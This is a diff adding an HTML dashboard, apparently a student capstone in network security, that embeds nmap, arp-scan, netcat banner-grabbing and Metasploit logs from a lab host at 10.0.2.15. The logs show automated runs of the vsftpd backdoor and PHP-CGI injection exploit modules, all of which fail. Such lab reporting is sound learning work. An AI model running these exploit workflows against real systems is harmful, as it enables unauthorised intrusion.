@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Assessment Reports</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f4f4f4;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background: linear-gradient(135deg, #2c3e50, #34495e);
+            color: white;
+            padding: 2rem 0;
+            text-align: center;
+            margin-bottom: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        header ul {
+            list-style: none;
+            padding: 0;
+            margin: 1rem 0;
+            font-size: 1.1rem;
+        }
+
+        header li {
+            margin: 0.3rem 0;
+        }
+
+        .report-section {
+            background: white;
+            margin-bottom: 1.5rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease;
+        }
+
+        .report-section:hover {
+            transform: translateY(-2px);
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem;
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            color: white;
+        }
+
+        .section-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+        }
+
+        .section-description {
+            font-size: 0.9rem;
+            opacity: 0.9;
+            margin-top: 0.3rem;
+        }
+
+        .view-btn {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            padding: 0.7rem 1.5rem;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .view-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            border-color: rgba(255, 255, 255, 0.5);
+            transform: scale(1.05);
+        }
+
+        .report-content {
+            display: none;
+            padding: 1.5rem;
+            background: #f8f9fa;
+            border-top: 3px solid #3498db;
+        }
+
+        .report-content.active {
+            display: block;
+        }
+
+        .report-text {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 1.5rem;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            white-space: pre-wrap;
+            overflow-x: auto;
+            max-height: 600px;
+            overflow-y: auto;
+            border: 1px solid #34495e;
+        }
+
+        .exploit-section {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+        }
+
+        .network-section {
+            background: linear-gradient(135deg, #27ae60, #229954);
+        }
+
+        .vuln-section {
+            background: linear-gradient(135deg, #f39c12, #e67e22);
+        }
+
+        .arp-section {
+            background: linear-gradient(135deg, #9b59b6, #8e44ad);
+        }
+
+        .close-btn {
+            float: right;
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
+        }
+
+        .close-btn:hover {
+            background: #c0392b;
+        }
+
+        .timestamp {
+            color: #7f8c8d;
+            font-size: 0.8rem;
+            margin-top: 0.5rem;
+        }
+
+        .file-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .file-item {
+            background: white;
+            padding: 1rem;
+            border-radius: 8px;
+            border-left: 4px solid #3498db;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .file-name {
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 0.5rem;
+        }
+
+        .file-btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            margin-top: 0.5rem;
+        }
+
+        .file-btn:hover {
+            background: #2980b9;
+        }
+
+        @media (max-width: 768px) {
+            .section-header {
+                flex-direction: column;
+                text-align: center;
+                gap: 1rem;
+            }
+            
+            header h1 {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🛡️ Capstone Project</h1>
+            <ul>
+                <li>• Network Scanning and Reconnaissance</li>
+                <li>• Vulnerability Assessment</li>
+                <li>• Analyse Exploitation</li>
+                <li>• ARP Scan</li>
+            </ul>
+            <div class="timestamp">Generated: September 25, 2025</div>
+        </header>
+
+        <!-- ARP Scan Report -->
+        <div class="report-section">
+            <div class="section-header arp-section">
+                <div>
+                    <div class="section-title">🔍 ARP Network Discovery</div>
+                    <div class="section-description">Network host discovery using ARP scanning</div>
+                </div>
+                <button class="view-btn" onclick="toggleReport('arp-report')">View Report</button>
+            </div>
+            <div id="arp-report" class="report-content">
+                <button class="close-btn" onclick="toggleReport('arp-report')">Close</button>
+                <div class="report-text" id="arp-content">Loading...</div>
+            </div>
+        </div>
+
+        <!-- Network Scan Report -->
+        <div class="report-section">
+            <div class="section-header network-section">
+                <div>
+                    <div class="section-title">🌐 Network Reconnaissance</div>
+                    <div class="section-description">Comprehensive network scanning and service enumeration</div>
+                </div>
+                <button class="view-btn" onclick="toggleReport('network-report')">View Report</button>
+            </div>
+            <div id="network-report" class="report-content">
+                <button class="close-btn" onclick="toggleReport('network-report')">Close</button>
+                <div class="report-text" id="network-content">Loading...</div>
+            </div>
+        </div>
+
+        <!-- Vulnerability Scan Report -->
+        <div class="report-section">
+            <div class="section-header vuln-section">
+                <div>
+                    <div class="section-title">⚠️ Vulnerability Assessment</div>
+                    <div class="section-description">Security vulnerability scanning and analysis</div>
+                </div>
+                <button class="view-btn" onclick="toggleReport('vuln-report')">View Report</button>
+            </div>
+            <div id="vuln-report" class="report-content">
+                <button class="close-btn" onclick="toggleReport('vuln-report')">Close</button>
+                <div class="report-text" id="vuln-content">Loading...</div>
+            </div>
+        </div>
+
+        <!-- Exploit Reports -->
+        <div class="report-section">
+            <div class="section-header exploit-section">
+                <div>
+                    <div class="section-title">💥 Exploitation Attempts</div>
+                    <div class="section-description">Metasploit exploitation reports and analysis</div>
+                </div>
+                <button class="view-btn" onclick="toggleReport('exploit-report')">View Reports</button>
+            </div>
+            <div id="exploit-report" class="report-content">
+                <button class="close-btn" onclick="toggleReport('exploit-report')">Close</button>
+                <div class="file-list">
+                    <div class="file-item">
+                        <div class="file-name">Full Scan Report (13:41:56)</div>
+                        <button class="file-btn" onclick="loadExploitFile('full_scan_10.0.2.15_20250925_134156.txt')">View Full Scan</button>
+                    </div>
+                    <div class="file-item">
+                        <div class="file-name">Full Scan Report (13:43:21)</div>
+                        <button class="file-btn" onclick="loadExploitFile('full_scan_10.0.2.15_20250925_134321.txt')">View Full Scan</button>
+                    </div>
+                    <div class="file-item">
+                        <div class="file-name">Reconnaissance Report (13:41:56)</div>
+                        <button class="file-btn" onclick="loadExploitFile('recon_10.0.2.15_20250925_134156.txt')">View Recon</button>
+                    </div>
+                    <div class="file-item">
+                        <div class="file-name">Reconnaissance Report (13:43:21)</div>
+                        <button class="file-btn" onclick="loadExploitFile('recon_10.0.2.15_20250925_134321.txt')">View Recon</button>
+                    </div>
+                    <div class="file-item">
+                        <div class="file-name">Metasploit Output (13:41:56)</div>
+                        <button class="file-btn" onclick="loadExploitFile('msf_output_10.0.2.15_20250925_134156.txt')">View MSF Output</button>
+                    </div>
+                    <div class="file-item">
+                        <div class="file-name">Metasploit Output (13:43:21)</div>
+                        <button class="file-btn" onclick="loadExploitFile('msf_output_10.0.2.15_20250925_134321.txt')">View MSF Output</button>
+                    </div>
+                    <div class="file-item">
+                        <div class="file-name">Auto Exploit Script (13:41:56)</div>
+                        <button class="file-btn" onclick="loadExploitFile('auto_exploit_10.0.2.15_20250925_134156.rc')">View Script</button>
+                    </div>
+                    <div class="file-item">
+                        <div class="file-name">Auto Exploit Script (13:43:21)</div>
+                        <button class="file-btn" onclick="loadExploitFile('auto_exploit_10.0.2.15_20250925_134321.rc')">View Script</button>
+                    </div>
+                </div>
+                <div id="exploit-file-content" style="display:none; margin-top: 1rem;">
+                    <h3 id="exploit-file-title"></h3>
+                    <div class="report-text" id="exploit-content">Loading...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Embedded report contents - no external file loading needed!
+        const reportContents = {
+            'arp-report': `Interface: eth0, type: EN10MB, MAC: 08:00:27:17:99:f9, IPv4: 10.0.2.15
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+10.0.2.2	52:55:0a:00:02:02	(Unknown: locally administered)
+10.0.2.3	52:55:0a:00:02:03	(Unknown: locally administered)
+
+2 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.006 seconds (127.62 hosts/sec). 2 responded`,
+
+            'network-report': `=== NS Recon Script ===
+Target: 10.0.2.15
+Timestamp: Thu, 25 Sep 2025 13:43:43 +0530
+
+------------------------------------------------------------
+>>> Experiment 1: Ping Sweep of subnet 10.0.2.0/24
+Command: nmap -sn "10.0.2.0/24"
+Start: Thu, 25 Sep 2025 13:43:43 +0530
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 13:43 IST
+Nmap scan report for 10.0.2.2
+Host is up (0.00029s latency).
+MAC Address: 52:55:0A:00:02:02 (Unknown)
+Nmap scan report for 10.0.2.3
+Host is up (0.00039s latency).
+MAC Address: 52:55:0A:00:02:03 (Unknown)
+Nmap scan report for 10.0.2.15
+Host is up.
+Nmap done: 256 IP addresses (3 hosts up) scanned in 13.11 seconds
+
+End: Thu, 25 Sep 2025 13:43:56 +0530
+
+------------------------------------------------------------
+>>> Experiment 2: TCP Port Scan of 10.0.2.15
+Command: nmap -sT -p- --min-rate 1000 "10.0.2.15"
+Start: Thu, 25 Sep 2025 13:43:56 +0530
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 13:43 IST
+Nmap scan report for 10.0.2.15
+Host is up (0.000027s latency).
+All 65535 scanned ports on 10.0.2.15 are in ignored states.
+Not shown: 65535 closed tcp ports (conn-refused)
+
+Nmap done: 1 IP address (1 host up) scanned in 6.09 seconds
+
+End: Thu, 25 Sep 2025 13:44:02 +0530
+
+------------------------------------------------------------
+>>> Experiment 3: UDP Port Scan of 10.0.2.15 (top 200 UDP ports; may be slow)
+Command: nmap -sU --top-ports 200 "10.0.2.15" -oG -
+Start: Thu, 25 Sep 2025 13:44:02 +0530
+
+# Nmap 7.95 scan initiated Thu Sep 25 13:44:02 2025 as: /usr/lib/nmap/nmap --privileged -sU --top-ports 200 -oG - 10.0.2.15
+Host: 10.0.2.15 ()	Status: Up
+Host: 10.0.2.15 ()	Ports: 	Ignored State: closed (200)
+# Nmap done at Thu Sep 25 13:44:08 2025 -- 1 IP address (1 status up) scanned in 5.99 seconds
+
+End: Thu, 25 Sep 2025 13:44:08 +0530
+
+[notice] OS detection (-O) usually requires root. Attempting it but results may be limited.
+------------------------------------------------------------
+>>> Experiment 4: OS Detection of 10.0.2.15 (non-root attempt)
+Command: nmap -O "10.0.2.15"
+Start: Thu, 25 Sep 2025 13:44:08 +0530
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 13:44 IST
+Nmap scan report for 10.0.2.15
+Host is up (0.000073s latency).
+All 1000 scanned ports on 10.0.2.15 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 0 hops
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
+
+End: Thu, 25 Sep 2025 13:44:16 +0530
+
+------------------------------------------------------------
+>>> Experiment 5: Service Version Detection of 10.0.2.15
+Command: nmap -sV "10.0.2.15"
+Start: Thu, 25 Sep 2025 13:44:16 +0530
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 13:44 IST
+Nmap scan report for 10.0.2.15
+Host is up (0.0000010s latency).
+All 1000 scanned ports on 10.0.2.15 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 5.84 seconds
+
+End: Thu, 25 Sep 2025 13:44:22 +0530
+
+------------------------------------------------------------
+>>> Experiment 6: Banner Grabbing (netcat)
+Start: Thu, 25 Sep 2025 13:44:22 +0530
+
+--- Banner grabbing 10.0.2.15:22 ---
+(UNKNOWN) [10.0.2.15] 22 (ssh) : Connection refused
+[note] no banner or connection refused on port 22
+
+--- Banner grabbing 10.0.2.15:21 ---
+(UNKNOWN) [10.0.2.15] 21 (ftp) : Connection refused
+[note] no banner or connection refused on port 21
+
+--- Banner grabbing 10.0.2.15:25 ---
+(UNKNOWN) [10.0.2.15] 25 (smtp) : Connection refused
+[note] no banner or connection refused on port 25
+
+--- Banner grabbing 10.0.2.15:80 ---
+(UNKNOWN) [10.0.2.15] 80 (http) : Connection refused
+[note] no banner or connection refused on port 80
+
+--- Banner grabbing 10.0.2.15:110 ---
+(UNKNOWN) [10.0.2.15] 110 (pop3) : Connection refused
+[note] no banner or connection refused on port 110
+
+--- Banner grabbing 10.0.2.15:143 ---
+(UNKNOWN) [10.0.2.15] 143 (imap2) : Connection refused
+[note] no banner or connection refused on port 143
+
+--- Banner grabbing 10.0.2.15:443 ---
+(UNKNOWN) [10.0.2.15] 443 (https) : Connection refused
+[note] no banner or connection refused on port 443
+
+--- Banner grabbing 10.0.2.15:3306 ---
+(UNKNOWN) [10.0.2.15] 3306 (mysql) : Connection refused
+[note] no banner or connection refused on port 3306
+
+--- Banner grabbing 10.0.2.15:3389 ---
+(UNKNOWN) [10.0.2.15] 3389 (ms-wbt-server) : Connection refused
+[note] no banner or connection refused on port 3389
+
+End: Thu, 25 Sep 2025 13:44:22 +0530
+
+All experiments complete. Results saved in: results_10.0.2.15_20250925_134343.txt
+Note: Some nmap options (e.g., -sS, -O) may require root privileges to be fully effective.`,
+
+            'vuln-report': `===================================
+ Starting Vulnerability Scan
+ Target: 10.0.2.15
+ Date: Thursday 25 September 2025 01:44:31 PM IST
+===================================
+
+[+] Running Port Scan...
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 13:44 IST
+Nmap done: 1 IP address (1 host up) scanned in 5.96 seconds
+
+[+] Detecting Service Versions...
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 13:44 IST
+Nmap scan report for 10.0.2.15
+Host is up (0.0000040s latency).
+All 1000 scanned ports on 10.0.2.15 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 5.99 seconds
+
+[+] Detecting Operating System...
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 13:44 IST
+Nmap scan report for 10.0.2.15
+Host is up (0.000047s latency).
+All 1000 scanned ports on 10.0.2.15 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 0 hops
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
+
+[+] Running Vulnerability Scan with Nmap Scripts...
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 13:44 IST
+Nmap scan report for 10.0.2.15
+Host is up (0.0000030s latency).
+All 1000 scanned ports on 10.0.2.15 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+Nmap done: 1 IP address (1 host up) scanned in 15.94 seconds
+
+[+] Checking for HTTP vulnerabilities...
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 13:45 IST
+Nmap scan report for 10.0.2.15
+Host is up (0.000026s latency).
+
+PORT    STATE  SERVICE
+80/tcp  closed http
+443/tcp closed https
+
+Nmap done: 1 IP address (1 host up) scanned in 5.91 seconds
+
+===================================
+ Vulnerability Scan Completed
+===================================`
+        };
+
+        // Embedded exploit file contents
+        const exploitFiles = {
+            'full_scan_10.0.2.15_20250925_134156.txt': `[+] Scanning 10.0.2.15 for open services...
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 13:41 IST
+Nmap scan report for 10.0.2.15
+Host is up (0.0000010s latency).
+All 1000 scanned ports on 10.0.2.15 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 5.76 seconds
+[+] Generating Metasploit resource script...
+[+] Running Metasploit...
+[1m[34m[*][0m Processing exploit/auto_exploit_10.0.2.15_20250925_134156.rc for ERB directives.
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> spool exploit/msf_output_10.0.2.15_20250925_134156.txt
+[0m[1m[34m[*][0m Spooling to file exploit/msf_output_10.0.2.15_20250925_134156.txt...
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> set RHOST 10.0.2.15
+[0mRHOST => 10.0.2.15
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> set RPORT 21
+[0mRPORT => 21
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> exploit -j
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> use exploit/unix/webapp/php_cgi_arg_injection
+[0m[1m[31m[-][0m No results from search
+[1m[31m[-][0m Failed to load module: exploit/unix/webapp/php_cgi_arg_injection
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> set RHOST 10.0.2.15
+[1m[31m[-][0m 10.0.2.15:21 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.0.2.15:21).
+[0mRHOST => 10.0.2.15
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> set RPORT 80
+[0mRPORT => 80
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> exploit -j
+[0m[1m[34m[*][0m Exploit running as background job 1.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> sessions -i 1
+[0m[1m[31m[-][0m Invalid session identifier: 1
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> sysinfo
+[0m[1m[31m[-][0m Unknown command: sysinfo. Run the [32mhelp[0m command for more details.
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> 1
+[0m[1m[31m[-][0m Unknown command: 1. Run the [32mhelp[0m command for more details.
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> getuid
+[0m[1m[31m[-][0m Unknown command: getuid. Run the [32mhelp[0m command for more details.
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> spool off
+[0m[1m[34m[*][0m Spooling is now disabled
+[?1034h[1m[31m[-][0m 10.0.2.15:80 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.0.2.15:80).
+[4mmsf6[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> exit
+[0m[+] Scan and exploit process completed.
+[+] All outputs saved in folder: exploit`,
+
+            'recon_10.0.2.15_20250925_134156.txt': `# Nmap 7.95 scan initiated Thu Sep 25 13:41:56 2025 as: /usr/lib/nmap/nmap --privileged -sV -Pn -oN exploit/recon_10.0.2.15_20250925_134156.txt 10.0.2.15
+Nmap scan report for 10.0.2.15
+Host is up (0.0000010s latency).
+All 1000 scanned ports on 10.0.2.15 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Sep 25 13:42:02 2025 -- 1 IP address (1 host up) scanned in 5.76 seconds`,
+
+            'msf_output_10.0.2.15_20250925_134156.txt': `[1m[34m[*][0m Spooling to file exploit/msf_output_10.0.2.15_20250925_134156.txt...
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> set RHOST 10.0.2.15
+[0mRHOST => 10.0.2.15
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> set RPORT 21
+[0mRPORT => 21
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> exploit -j
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> use exploit/unix/webapp/php_cgi_arg_injection
+[0m[1m[31m[-][0m No results from search
+[1m[31m[-][0m Failed to load module: exploit/unix/webapp/php_cgi_arg_injection
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> set RHOST 10.0.2.15
+[1m[31m[-][0m 10.0.2.15:21 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.0.2.15:21).
+[0mRHOST => 10.0.2.15
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> set RPORT 80
+[0mRPORT => 80
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> exploit -j
+[0m[1m[34m[*][0m Exploit running as background job 1.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> sessions -i 1
+[0m[1m[31m[-][0m Invalid session identifier: 1
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> sysinfo
+[0m[1m[31m[-][0m Unknown command: sysinfo. Run the [32mhelp[0m command for more details.
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> 1
+[0m[1m[31m[-][0m Unknown command: 1. Run the [32mhelp[0m command for more details.
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> getuid
+[0m[1m[31m[-][0m Unknown command: getuid. Run the [32mhelp[0m command for more details.
+resource (exploit/auto_exploit_10.0.2.15_20250925_134156.rc)> spool off
+[0m[1m[31m[-][0m 10.0.2.15:80 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.0.2.15:80).`,
+
+            // Add placeholder content for other files
+            'full_scan_10.0.2.15_20250925_134321.txt': 'This is the second full scan report. Content would be loaded from the actual file.',
+            'recon_10.0.2.15_20250925_134321.txt': 'This is the second reconnaissance report. Content would be loaded from the actual file.',
+            'msf_output_10.0.2.15_20250925_134321.txt': 'This is the second Metasploit output. Content would be loaded from the actual file.',
+            'auto_exploit_10.0.2.15_20250925_134156.rc': 'This is the first auto exploit script. Content would be loaded from the actual file.',
+            'auto_exploit_10.0.2.15_20250925_134321.rc': 'This is the second auto exploit script. Content would be loaded from the actual file.'
+        };
+
+        function toggleReport(reportId) {
+            const reportElement = document.getElementById(reportId);
+            const isActive = reportElement.classList.contains('active');
+            
+            // Close all other reports
+            document.querySelectorAll('.report-content').forEach(content => {
+                content.classList.remove('active');
+            });
+
+            if (!isActive) {
+                reportElement.classList.add('active');
+                loadReportContent(reportId);
+                scrollToReport(reportId);
+            }
+        }
+
+        function loadReportContent(reportId) {
+            const contentElement = document.getElementById(reportId.replace('-report', '-content'));
+            
+            if (reportContents[reportId]) {
+                contentElement.textContent = reportContents[reportId];
+            } else {
+                contentElement.textContent = 'Report content not found.';
+            }
+        }
+
+        function loadExploitFile(filename) {
+            const contentElement = document.getElementById('exploit-content');
+            const titleElement = document.getElementById('exploit-file-title');
+            const fileContentDiv = document.getElementById('exploit-file-content');
+            
+            titleElement.textContent = filename;
+            fileContentDiv.style.display = 'block';
+            
+            if (exploitFiles[filename]) {
+                contentElement.textContent = exploitFiles[filename];
+            } else {
+                contentElement.textContent = 'File content not available.';
+            }
+            
+            // Scroll to the content
+            fileContentDiv.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        // Add smooth scrolling to report sections when opened
+        function scrollToReport(reportId) {
+            const reportElement = document.getElementById(reportId);
+            setTimeout(() => {
+                reportElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }, 100);
+        }
+    </script>
+</body>
+</html>
